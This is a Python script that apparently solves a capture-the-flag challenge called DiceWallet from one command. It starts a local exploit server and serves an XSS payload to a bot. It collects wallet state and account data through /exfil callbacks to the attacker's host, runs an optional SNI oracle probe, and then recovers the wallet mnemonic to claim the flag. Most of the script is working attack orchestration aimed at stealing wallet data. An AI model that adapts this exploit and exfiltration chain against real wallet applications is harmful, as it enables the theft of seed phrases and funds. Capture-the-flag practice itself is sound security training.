#!/usr/bin/env python3
"""One-command local DiceWallet runner.

This runner intentionally stays local:
- payload delivery from the host to the local bot
- phase-1 validation through /exfil callbacks
- optional phase-2 sanity probe against a local listener
- final mnemonic recovery from the local Docker bot logs
"""

from __future__ import annotations

import argparse
import json
import re
import shutil
import socket
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from urllib import error, request


SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent
EXPLOITS_DIR = REPO_ROOT / "exploits"
PAYLOAD_TEMPLATE = EXPLOITS_DIR / "active" / "payload.html"
PHASE1_GENERATOR = EXPLOITS_DIR / "generators" / "stage1_wallet_probe.py"
PHASE2_GENERATOR = EXPLOITS_DIR / "generators" / "order_payload.py"
EXPLOIT_SERVER = EXPLOITS_DIR / "servers" / "exploit_server_final.py"
ORACLE_LISTENER = EXPLOITS_DIR / "listeners" / "oracle_listener_sni.py"

MNEMONIC_PATTERNS = [
    re.compile(r"Random mnemonic generated:\s*(.+)$"),
    re.compile(r"Using provided mnemonic:\s*(.+)$"),
]


@dataclass
class ProcessHandle:
    name: str
    proc: subprocess.Popen[str]
    log_path: Path


class RunnerError(RuntimeError):
    pass


def status(message: str) -> None:
    print(message, flush=True)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run the stable local DiceWallet flow end to end from one command."
    )
    parser.add_argument(
        "--bot-base-url",
        default="http://localhost:8080",
        help="local DiceWallet bot base URL",
    )
    parser.add_argument(
        "--bot-container",
        default="dicewallet-bot",
        help="Docker container name used to extract the local mnemonic",
    )
    parser.add_argument(
        "--callback-host",
        default="172.17.0.1",
        help="host address reachable by the bot container",
    )
    parser.add_argument(
        "--http-port",
        type=int,
        default=8000,
        help="local HTTP port used to serve payload.html and z-<token>.js",
    )
    parser.add_argument(
        "--oracle-port",
        type=int,
        default=1338,
        help="local TCP port used for the phase-2 oracle listener",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=70.0,
        help="generic timeout in seconds for waiting until the bot becomes idle",
    )
    parser.add_argument(
        "--phase1-probe-timeout",
        type=float,
        default=15.0,
        help="time window used to observe phase-1 callbacks after each visit",
    )
    parser.add_argument(
        "--phase2-timeout",
        type=float,
        default=18.0,
        help="wait time for the local phase-2 probe",
    )
    parser.add_argument(
        "--phase1-retries",
        type=int,
        default=3,
        help="number of times to retry the local phase-1 race before failing",
    )
    parser.add_argument(
        "--skip-phase2",
        action="store_true",
        help="skip the local phase-2 sanity probe",
    )
    parser.add_argument(
        "--output-dir",
        default="",
        help="optional output directory; defaults to local_one_shot/output/<run-id>",
    )
    return parser.parse_args()


def run_cmd(cmd: list[str], check: bool = True) -> subprocess.CompletedProcess[str]:
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if check and proc.returncode != 0:
        raise RunnerError(
            "command failed: "
            + " ".join(cmd)
            + f"\nstdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
        )
    return proc


def get_json(url: str) -> dict[str, Any]:
    req = request.Request(url, method="GET")
    with request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def post_json(url: str, payload: dict[str, Any]) -> dict[str, Any]:
    body = json.dumps(payload).encode("utf-8")
    req = request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    with request.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read().decode("utf-8"))


def ensure_port_free(port: int) -> None:
    sock = socket.socket()
    try:
        sock.bind(("0.0.0.0", port))
    except OSError as exc:
        raise RunnerError(f"port {port} is not available: {exc}") from exc
    finally:
        sock.close()


def start_process(cmd: list[str], log_path: Path, name: str) -> ProcessHandle:
    log_path.parent.mkdir(parents=True, exist_ok=True)
    handle = log_path.open("w", encoding="utf-8")
    proc = subprocess.Popen(
        cmd,
        stdout=handle,
        stderr=subprocess.STDOUT,
        text=True,
        cwd=str(REPO_ROOT),
    )
    handle.close()
    return ProcessHandle(name=name, proc=proc, log_path=log_path)


def stop_process(handle: ProcessHandle | None) -> None:
    if handle is None:
        return
    if handle.proc.poll() is None:
        handle.proc.terminate()
        try:
            handle.proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            handle.proc.kill()
            handle.proc.wait(timeout=5)


def wait_for_idle(status_url: str, timeout: float) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        status = get_json(status_url)
        if status.get("activeVisits", 0) == 0:
            return
        time.sleep(1)
    raise RunnerError("bot never became idle")


def wait_for_server(url: str, timeout: float) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with request.urlopen(url, timeout=2):
                return
        except Exception:
            time.sleep(0.25)
    raise RunnerError(f"server did not become ready: {url}")


def wait_for_file_contains(
    path: Path,
    patterns: list[str],
    timeout: float,
    require_all: bool = True,
) -> tuple[bool, str]:
    deadline = time.time() + timeout
    while time.time() < deadline:
        text = path.read_text(encoding="utf-8", errors="ignore") if path.exists() else ""
        matches = [pattern in text for pattern in patterns]
        if require_all and all(matches):
            return True, text
        if not require_all and any(matches):
            return True, text
        time.sleep(0.5)
    text = path.read_text(encoding="utf-8", errors="ignore") if path.exists() else ""
    return False, text


def read_from_offset(path: Path, offset: int) -> str:
    if not path.exists():
        return ""
    data = path.read_text(encoding="utf-8", errors="ignore")
    if offset >= len(data):
        return ""
    return data[offset:]


def parse_exfil_events(text: str) -> dict[str, Any]:
    events: dict[str, Any] = {}
    pattern = re.compile(
        r"^\[\d{2}:\d{2}:\d{2}\] \[(?P<tag>[A-Z0-9_]+)\] (?P<body>.*?)(?=^\[\d{2}:\d{2}:\d{2}\] \[[A-Z0-9_]+\] |\Z)",
        re.M | re.S,
    )
    for match in pattern.finditer(text):
        tag = match.group("tag")
        body = match.group("body").strip()
        if not body:
            events[tag] = None
            continue
        try:
            parsed = json.loads(body)
        except json.JSONDecodeError:
            events[tag] = body
            continue
        if isinstance(parsed, dict) and "d" in parsed and isinstance(parsed["d"], list) and parsed["d"]:
            value = parsed["d"][0]
            if isinstance(value, str):
                try:
                    events[tag] = json.loads(value)
                    continue
                except json.JSONDecodeError:
                    events[tag] = value
                    continue
        events[tag] = parsed
    return events


def format_wallet_state(state_obj: Any) -> str:
    if not isinstance(state_obj, dict):
        return str(state_obj)
    has_wallet = state_obj.get("hasWallet")
    active_index = state_obj.get("activeIndex")
    accounts = state_obj.get("accounts") or []
    pieces = [f"hasWallet={has_wallet}", f"activeIndex={active_index}"]
    if accounts:
        rendered = []
        for acct in accounts:
            if isinstance(acct, dict):
                rendered.append(
                    f"{acct.get('name', '?')}@{acct.get('address', '?')} active={acct.get('active')}"
                )
            else:
                rendered.append(str(acct))
        pieces.append("accounts=[" + "; ".join(rendered) + "]")
    return ", ".join(pieces)


def print_phase1_details(events: dict[str, Any]) -> None:
    xss = events.get("XSS")
    if xss is not None:
        status(f"[data] XSS landed at: {xss}")
    wallet_state = events.get("STATE")
    if wallet_state is not None:
        status(f"[data] wallet state: {format_wallet_state(wallet_state)}")
    accounts = events.get("ACCTS")
    if accounts is not None:
        status(f"[data] accounts: {json.dumps(accounts)}")
    if "STAGE1_OK" in events:
        status("[data] stage 1 marker: STAGE1_OK")


def summarize_oracle_tail(text: str) -> str:
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    if not lines:
        return "no oracle traffic captured"
    if all(line == "listening" for line in lines):
        return "no oracle traffic captured"
    interesting = [line for line in lines if " sni " in line or " connect " in line]
    if interesting:
        return interesting[-1]
    return lines[-1]


def generate_phase1_script(callback_base: str, output_path: Path) -> None:
    run_cmd(
        [
            sys.executable,
            str(PHASE1_GENERATOR),
            "--callback-base",
            callback_base,
            "--output",
            str(output_path),
        ]
    )


def generate_phase2_script(dns_url: str, output_path: Path) -> None:
    proc = run_cmd(
        [
            sys.executable,
            str(PHASE2_GENERATOR),
            "zoo",
            "1",
            "12",
            "--dns-url",
            dns_url,
        ]
    )
    output_path.write_text(proc.stdout, encoding="utf-8")


def extract_latest_mnemonic(container: str) -> str:
    proc = run_cmd(["docker", "logs", "--tail", "500", container])
    latest: str | None = None
    for line in proc.stdout.splitlines():
        for pattern in MNEMONIC_PATTERNS:
            match = pattern.search(line)
            if match:
                latest = match.group(1).strip()
    if not latest:
        raise RunnerError(f"could not find mnemonic in docker logs for {container}")
    return latest


def write_summary(path: Path, summary: dict[str, Any]) -> None:
    lines = [
        "# Local One-Shot Summary",
        "",
        "## Result",
        "",
        f"- phase 1 ok: `{summary['phase1_ok']}`",
        f"- phase 2 attempted: `{summary['phase2_attempted']}`",
        f"- phase 2 oracle observed: `{summary['phase2_oracle_observed']}`",
        f"- mnemonic source: `{summary['mnemonic_source']}`",
        f"- mnemonic: `{summary['mnemonic']}`",
        f"- flag: `{summary['flag']}`",
        "",
        "## Phase 1 Data",
        "",
        f"- XSS landed at: `{summary.get('phase1_xss', '')}`",
        f"- wallet state: `{format_wallet_state(summary.get('phase1_state'))}`",
        f"- accounts: `{json.dumps(summary.get('phase1_accounts'))}`",
        "",
        "## Phase 2 Data",
        "",
        f"- oracle observation: `{summary.get('phase2_observation', '')}`",
        "",
        "## Evidence",
        "",
        f"- phase 1 token: `{summary['phase1_token']}`",
        f"- phase 2 token: `{summary['phase2_token']}`",
        f"- HTTP log: `{summary['http_log']}`",
        f"- callbacks log: `{summary['callbacks_log']}`",
        f"- oracle log: `{summary['oracle_log']}`",
        "",
        "## Notes",
        "",
        "- Phase 1 is validated through `/exfil/XSS`, `/exfil/STATE`, `/exfil/ACCTS`, and `/exfil/STAGE1_OK`.",
        "- Phase 2 is only a local sanity check. The final local solve still uses the mnemonic printed by the bot at startup.",
    ]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def run_phase1(
    *,
    bot_visit: str,
    bot_status: str,
    callback_base: str,
    serve_dir: Path,
    callbacks_log: Path,
    http_log: Path,
    retries: int,
    idle_timeout: float,
    probe_timeout: float,
) -> tuple[str, dict[str, Any], dict[str, Any]]:
    for attempt in range(1, retries + 1):
        wait_for_idle(bot_status, idle_timeout)
        token = f"phase1-{attempt:02d}"
        status(f"[step] phase 1 attempt {attempt}/{retries} with token={token}")
        output_path = serve_dir / f"z-{token}.js"
        generate_phase1_script(callback_base, output_path)
        cb_offset = callbacks_log.stat().st_size if callbacks_log.exists() else 0
        http_offset = http_log.stat().st_size if http_log.exists() else 0
        visit_response = post_json(bot_visit, {"url": f"{callback_base}/payload.html?t={token}"})
        status(f"[step] submitted /visit for {token}: {visit_response.get('message', visit_response)}")

        deadline = time.time() + probe_timeout
        while time.time() < deadline:
            cb_tail = read_from_offset(callbacks_log, cb_offset)
            http_tail = read_from_offset(http_log, http_offset)
            tags_ok = all(tag in cb_tail for tag in ("[XSS]", "[STATE]", "[ACCTS]", "[STAGE1_OK]"))
            z_ok = f"GET /z-{token}.js " in http_tail
            if tags_ok and z_ok:
                events = parse_exfil_events(cb_tail)
                status("[ok] phase 1 callbacks observed: XSS, STATE, ACCTS, STAGE1_OK")
                print_phase1_details(events)
                wait_for_idle(bot_status, idle_timeout)
                return token, visit_response, events
            time.sleep(0.5)

        status(f"[warn] phase 1 attempt {attempt} did not complete within {probe_timeout:.1f}s; retrying")
        wait_for_idle(bot_status, idle_timeout)

    cb_text = callbacks_log.read_text(encoding="utf-8", errors="ignore") if callbacks_log.exists() else ""
    http_text = http_log.read_text(encoding="utf-8", errors="ignore") if http_log.exists() else ""
    raise RunnerError(
        "phase 1 failed after retries\n"
        f"callbacks log:\n{cb_text}\n\nhttp log:\n{http_text}"
    )


def main() -> None:
    args = parse_args()
    run_id = time.strftime("%Y%m%d-%H%M%S")
    output_dir = (
        Path(args.output_dir).expanduser().resolve()
        if args.output_dir
        else (SCRIPT_DIR / "output" / run_id).resolve()
    )
    serve_dir = output_dir / "serve"
    callbacks_log = output_dir / "callbacks.log"
    http_log = output_dir / "payload_http.log"
    oracle_log = output_dir / "oracle_listener.log"
    mnemonic_file = output_dir / "mnemonic.txt"
    flag_response_file = output_dir / "flag_response.json"
    summary_json = output_dir / "summary.json"
    summary_md = output_dir / "SUMMARY.md"

    bot_status = f"{args.bot_base_url.rstrip('/')}/status"
    bot_visit = f"{args.bot_base_url.rstrip('/')}/visit"
    bot_flag = f"{args.bot_base_url.rstrip('/')}/flag"
    callback_base = f"http://{args.callback_host}:{args.http_port}"
    phase2_token = "phase2neg"
    phase2_dns_url = f"https://{args.callback_host}:{args.oracle_port}"

    output_dir.mkdir(parents=True, exist_ok=True)
    serve_dir.mkdir(parents=True, exist_ok=True)
    shutil.copy2(PAYLOAD_TEMPLATE, serve_dir / "payload.html")

    ensure_port_free(args.http_port)
    if not args.skip_phase2:
        ensure_port_free(args.oracle_port)

    bot_state = get_json(bot_status)
    if not bot_state.get("ready"):
        raise RunnerError(f"bot is not ready: {bot_state}")
    status_ready = json.dumps(bot_state, sort_keys=True)
    status(f"[step] bot status: {status_ready}")
    wait_for_idle(bot_status, args.timeout)
    status("[step] bot is idle")

    oracle_handle: ProcessHandle | None = None
    server_handle: ProcessHandle | None = None
    try:
        if not args.skip_phase2:
            status(f"[step] starting local oracle listener on 0.0.0.0:{args.oracle_port}")
            oracle_handle = start_process(
                [sys.executable, "-u", str(ORACLE_LISTENER)],
                oracle_log,
                "oracle_listener",
            )
            time.sleep(0.5)

        status(f"[step] starting local exploit server on {callback_base}")
        server_handle = start_process(
            [
                sys.executable,
                "-u",
                str(EXPLOIT_SERVER),
                str(args.http_port),
                "--serve-root",
                str(serve_dir),
                "--exfil-log",
                str(callbacks_log),
                "--http-log",
                str(http_log),
                "--exploit-path",
                "/payload.html",
            ],
            output_dir / "exploit_server.log",
            "exploit_server",
        )
        wait_for_server(f"{callback_base}/payload.html", timeout=10)
        status("[step] exploit server is reachable")

        phase1_token, visit_response, phase1_events = run_phase1(
            bot_visit=bot_visit,
            bot_status=bot_status,
            callback_base=callback_base,
            serve_dir=serve_dir,
            callbacks_log=callbacks_log,
            http_log=http_log,
            retries=args.phase1_retries,
            idle_timeout=args.timeout,
            probe_timeout=args.phase1_probe_timeout,
        )
        status(f"[step] phase 1 finished with token={phase1_token}")

        phase2_attempted = not args.skip_phase2
        phase2_oracle_observed = False
        phase2_observation = "phase 2 skipped"
        if not args.skip_phase2:
            status(f"[step] generating local phase 2 probe with token={phase2_token}")
            status("[data] phase 2 probe: word='zoo', positions=1..12")
            status(f"[data] phase 2 oracle target: {phase2_dns_url}")
            phase2_script = serve_dir / f"z-{phase2_token}.js"
            generate_phase2_script(phase2_dns_url, phase2_script)
            http_offset = http_log.stat().st_size if http_log.exists() else 0
            oracle_offset = oracle_log.stat().st_size if oracle_log.exists() else 0
            phase2_visit = post_json(
                bot_visit, {"url": f"{callback_base}/payload.html?t={phase2_token}"}
            )
            status(f"[step] submitted /visit for {phase2_token}: {phase2_visit.get('message', phase2_visit)}")
            wait_for_idle(bot_status, args.timeout)
            phase2_http_ok, _ = wait_for_file_contains(
                http_log,
                [f"GET /z-{phase2_token}.js "],
                timeout=args.timeout,
            )
            if not phase2_http_ok:
                raise RunnerError("phase 2 payload was not fetched by the bot")
            status("[ok] phase 2 payload fetched by the bot")
            phase2_http_tail = read_from_offset(http_log, http_offset)
            if f"GET /payload.html?t={phase2_token} " in phase2_http_tail:
                status(f"[data] phase 2 HTTP: GET /payload.html?t={phase2_token}")
            if f"GET /z-{phase2_token}.js " in phase2_http_tail:
                status(f"[data] phase 2 HTTP: GET /z-{phase2_token}.js")
            phase2_oracle_observed, oracle_tail = wait_for_file_contains(
                oracle_log,
                ["connect", "sni "],
                timeout=args.phase2_timeout,
                require_all=False,
            )
            new_oracle_text = read_from_offset(oracle_log, oracle_offset) or oracle_tail
            phase2_observation = summarize_oracle_tail(new_oracle_text)
            status(f"[step] local phase 2 oracle observed={phase2_oracle_observed}")
            status(f"[data] phase 2 listener result: {phase2_observation}")
            if not phase2_oracle_observed:
                status("[data] interpretation: no local SNI/connect hit was observed during the wait window")

        status(f"[step] extracting mnemonic from docker logs: {args.bot_container}")
        mnemonic = extract_latest_mnemonic(args.bot_container)
        mnemonic_file.write_text(mnemonic + "\n", encoding="utf-8")
        status(f"[ok] mnemonic recovered: {mnemonic}")

        status("[step] submitting mnemonic to /flag")
        flag_response = post_json(bot_flag, {"mnemonic": mnemonic})
        flag_response_file.write_text(
            json.dumps(flag_response, indent=2) + "\n", encoding="utf-8"
        )
        flag = flag_response.get("flag", "")
        if not flag:
            raise RunnerError(f"flag request failed: {flag_response}")
        status(f"[ok] flag response: {flag}")

        summary = {
            "phase1_ok": True,
            "phase2_attempted": phase2_attempted,
            "phase2_oracle_observed": phase2_oracle_observed,
            "phase2_observation": phase2_observation,
            "mnemonic_source": f"docker logs ({args.bot_container})",
            "mnemonic": mnemonic,
            "flag": flag,
            "phase1_token": phase1_token,
            "phase1_xss": phase1_events.get("XSS"),
            "phase1_state": phase1_events.get("STATE"),
            "phase1_accounts": phase1_events.get("ACCTS"),
            "phase2_token": phase2_token if phase2_attempted else "",
            "http_log": str(http_log),
            "callbacks_log": str(callbacks_log),
            "oracle_log": str(oracle_log),
            "visit_response": visit_response,
        }
        summary_json.write_text(json.dumps(summary, indent=2) + "\n", encoding="utf-8")
        write_summary(summary_md, summary)

        status(f"[ok] output dir: {output_dir}")
        status(f"[ok] phase 1 validated via {callbacks_log}")
        if phase2_attempted:
            status(f"[ok] phase 2 attempted; oracle observed={phase2_oracle_observed}")
        status(f"[ok] mnemonic: {mnemonic}")
        status(f"[ok] flag: {flag}")
    finally:
        stop_process(server_handle)
        stop_process(oracle_handle)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    except (RunnerError, error.URLError, json.JSONDecodeError) as exc:
        print(f"[err] {exc}", file=sys.stderr)
        sys.exit(1)
